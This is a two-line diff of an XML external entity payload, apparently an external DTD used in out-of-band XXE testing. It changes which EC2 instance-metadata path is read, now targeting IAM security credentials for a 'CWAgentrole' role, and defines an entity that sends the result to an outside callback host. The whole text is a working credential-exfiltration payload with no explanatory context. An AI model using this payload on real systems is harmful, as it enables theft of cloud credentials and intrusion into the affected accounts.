@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance">
+<!ENTITY % data SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/CWAgentrole">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://hyjlib4ebaxelqil748wb44j2a81w2kr.l.prod.burpcloth.infosec.a2z.com/?%data;'>">
